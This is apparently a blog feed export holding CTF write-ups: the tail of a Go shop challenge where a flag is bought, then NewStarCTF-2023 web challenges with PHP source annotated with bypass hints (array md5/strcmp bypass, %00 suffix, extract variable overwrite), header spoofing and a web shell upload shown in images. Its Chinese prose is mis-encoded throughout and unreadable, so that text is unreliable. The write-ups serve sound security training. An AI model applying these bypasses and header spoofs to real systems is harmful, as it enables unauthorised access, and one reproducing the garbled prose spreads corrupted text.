		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> user<span class="token punctuation">.</span>Money <span class="token operator">>=</span> product<span class="token punctuation">.</span>Price<span class="token operator">*</span><span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		user<span class="token punctuation">.</span>Money <span class="token operator">-=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Buy %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough money"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">SellHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	data <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span><span class="token function">ShouldBindJSON</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>data<span class="token punctuation">)</span>

	<span class="token keyword">var</span> product <span class="token operator">*</span>Product

	<span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> products <span class="token punctuation">&#123;</span>
		<span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">==</span> v<span class="token punctuation">.</span>Name <span class="token punctuation">&#123;</span>
			product <span class="token operator">=</span> v
			<span class="token keyword">break</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> product <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"No such product"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	count <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>data<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
	n<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> strconv<span class="token punctuation">.</span><span class="token function">Atoi</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token string">"num"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> n <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"Product num can't be negative"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> count <span class="token operator">>=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		user<span class="token punctuation">.</span>Money <span class="token operator">+=</span> product<span class="token punctuation">.</span>Price <span class="token operator">*</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Sell %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough product"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
	user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

	v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span><span class="token string">"Flag"</span><span class="token punctuation">]</span>
	<span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token operator">||</span> v <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
			<span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You must buy &lt;code>flag&lt;/code> first"</span><span class="token punctuation">,</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>

	flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
	c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span>
		<span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: &lt;code>%s&lt;/code>"</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
	rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

	tpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFS</span><span class="token punctuation">(</span>fs<span class="token punctuation">,</span> <span class="token string">"public/index.html"</span><span class="token punctuation">)</span>
	store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

	r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">SetHTMLTemplate</span><span class="token punctuation">(</span>tpl<span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>

	r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>

	api <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/info"</span><span class="token punctuation">,</span> InfoHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/buy"</span><span class="token punctuation">,</span> BuyHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/sell"</span><span class="token punctuation">,</span> SellHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>
		api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/reset"</span><span class="token punctuation">,</span> ResetHandler<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/main.js"</span><span class="token punctuation">,</span> <span class="token string">"public/main.js"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>
	r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/simple.css"</span><span class="token punctuation">,</span> <span class="token string">"public/simple.css"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>

	r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8000"</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å®˜æ–¹wpä»‹ç»ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/244ac8e4d87f4ccba56801b545fb6c11.png" alt="132"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>NewStarCTF-2023</title>
    <url>/2023/10/06/NewStarCTF-2023/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="week1-web"><a href="#week1-web" class="headerlink" title="week1-web"></a>week1-web</h2><h3 id="æ³„æ¼çš„ç§˜å¯†"><a href="#æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="æ³„æ¼çš„ç§˜å¯†"></a>æ³„æ¼çš„ç§˜å¯†</h3><p><strong>robots.txt+<a href="http://www.zip/">www.zip</a></strong> å¾—åˆ°flagã€‚</p>
<h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://img-blog.csdnimg.cn/0438e24d7ed54a9d8c4375b2347ea9a6.png" alt="1"><br>èšå‰‘è¿æ¥ä¹‹åæ‰¾åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/5a0f93ee0a904b79b076100d8c03dfe9.png" alt="5"></p>
<h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>å…ˆGETä¼ å…¥ctf&#x3D;1ï¼Œåœ¨ä¼ å…¥secret&#x3D;1ï¼Œå‘ç°éœ€è¦ä¼ å…¥ç‰¹å®šå€¼<br><img src="https://img-blog.csdnimg.cn/c50cefbdd8e64ff3b2152524b7413d18.png" alt="1"><br>æŸ¥çœ‹æºç æ‰¾åˆ°secretçš„å€¼<strong>n3wst4rCTF2023g00000d</strong><br><img src="https://img-blog.csdnimg.cn/7f5108c2a098479c9fb5b88b15f62d94.png" alt="5"><br>æ›´æ”¹cookieä¸­çš„powerçš„å€¼ï¼Œæ”¹ä¸º<strong>ctfer</strong>ã€‚<br>æ›´æ”¹UAå¤´ä¸º<strong>NewStarCTF2023</strong>ã€‚<br>æ·»åŠ Refererä¸º<strong>newstarctf.com</strong>ã€‚<br>æ·»åŠ X-Real-Ipä¸º<strong>127.0.0.1</strong>ã€‚<br>æ‹¿åˆ°flag<br><img src="https://img-blog.csdnimg.cn/2c6c547e81d44b5eb3fb30ccff29ed98.png" alt="123"></p>
<h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>è®©å…¶æŠ¥é”™å³å¯æ‹¿åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/51afcb55d57645e291489cc2d73b1685.png" alt="456"></p>
<h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>ç®€å•å®¡è®¡ä¸€ä¸‹ä»£ç </p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//æ•°ç»„ç»•è¿‡</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//æ•°ç»„ç»•è¿‡</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//æ•°ç»„ç»•è¿‡</span>
<span class="token comment">//å› ä¸ºstrcmp()æ— æ³•æ¯”è¾ƒæ•°ç»„ï¼Œåˆ™æŠ¥é”™å¹¶è¿”å›0ï¼Œ0==0æˆç«‹ã€‚</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//ç»•è¿‡!is_numeric</span>
<span class="token comment">//åç¼€%00</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br>"</span><span class="token punctuation">;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é‡‡ç”¨å˜é‡è¦†ç›– -> flag5='.'</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"c4d038"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//çˆ†ç ´å‡ºæ¥æ˜¯114514</span>
